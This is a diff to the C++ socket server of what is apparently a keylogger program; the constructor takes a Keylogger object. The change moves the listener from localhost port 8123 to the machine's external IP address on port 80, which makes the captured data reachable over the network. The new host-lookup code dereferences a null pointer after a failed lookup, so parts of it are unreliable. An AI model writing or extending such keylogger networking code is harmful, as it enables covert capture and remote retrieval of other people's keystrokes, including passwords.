@@ -1,6 +1,35 @@
 #include "stdafx.h"
 #include "SocketServer.h"
 
+void SocketServer::initHostInfo() {
+	char ac[80];
+	if (gethostname(ac, sizeof(ac)) == SOCKET_ERROR) {
+		std::cerr << "Error " << WSAGetLastError() <<
+			" when getting local host name." << endl;
+	} else {
+		this->hostName = ac;
+	}
+	
+
+	struct hostent *phe = gethostbyname(ac);
+	if (phe == 0) {
+		std::cerr << "Yow! Bad host lookup." << endl;
+	}
+
+	std::string ip = "";
+	for (int i = 0; phe->h_addr_list[i] != 0; ++i) {
+		struct in_addr addr;
+		memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));
+
+		std::string possibleIp = inet_ntoa(addr);
+		if (possibleIp.find('.') == 2 && possibleIp.at(0) == '1' || ip == "") {
+			ip = possibleIp;
+		}
+	}
+	
+	this->ip = ip;
+}
+
 SocketServer::SocketServer(Keylogger* logger) {
 	listenSocket = INVALID_SOCKET;
 
@@ -21,7 +50,10 @@ SocketServer::SocketServer(Keylogger* logger) {
 
 	hints.ai_flags = AI_PASSIVE;
 
-	result = getaddrinfo("127.0.0.1", "8123", &hints, &addr);
+	this->initHostInfo();
+	std::cout << this->ip << " " << this->hostName << std::endl;
+
+	result = getaddrinfo(ip.c_str(), "80", &hints, &addr);
 
 	if (result != 0) {
 		cerr << "getaddrinfo failed: " << result << "\n";
